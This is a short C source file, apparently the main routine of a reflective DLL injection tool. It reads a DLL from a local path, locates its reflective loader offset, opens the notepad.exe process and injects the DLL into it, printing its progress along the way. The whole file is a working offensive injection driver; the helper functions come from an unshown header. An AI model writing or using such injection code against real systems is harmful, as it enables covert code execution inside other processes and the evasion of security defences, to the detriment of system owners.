#include "box.h"

int main()
{

	HANDLE	hProcess = NULL;

	DWORD	PID = 0,
			ReflectiveDllOffset = 0,
			ReflectiveDllSize = 0;

	PWCHAR	ReflectiveDllName = L"C:\\Users\\Mag\\Desktop\\C-C++\\reflectivedll\\x64\\Release\\reflectivedll.dll",
			TargetProcessName = L"notepad.exe";

	LPVOID	ReflectiveDllBuffer = NULL;

	INFO("Reading Dll...");

	if (!ReadTargetFile(ReflectiveDllName, &ReflectiveDllBuffer, &ReflectiveDllSize))
	{
		PRINT_ERROR("ReadTargetFile");
		return 1;
	}


	INFO("Calculating File Offset...");

	if (!(ReflectiveDllOffset = GetReflectiveLdrOffset(ReflectiveDllBuffer)))
	{
		PRINT_ERROR("GetReflectiveLdrOffset");
		return 1;
	}

	OKAY("[0x%0.8X] Reflective Loader Offset Found!", ReflectiveDllOffset);

	INFO("Getting Target Process PID...");

	if (!GetRemoteId(TargetProcessName, &PID, &hProcess))
	{
		PRINT_ERROR("GetRemoteId");
		return 1;
	}

	OKAY("[%ld] Current Pid For %ls", PID, TargetProcessName);

	INFO("Injecting (Moment Of Truth)...");

	if (!InjectReflectiveDll(hProcess, ReflectiveDllOffset, (PBYTE)ReflectiveDllBuffer, ReflectiveDllSize))
	{
		PRINT_ERROR("InjectReflectiveDll");
		return 1;
	}

	OKAY("Success!");
	return 0;

}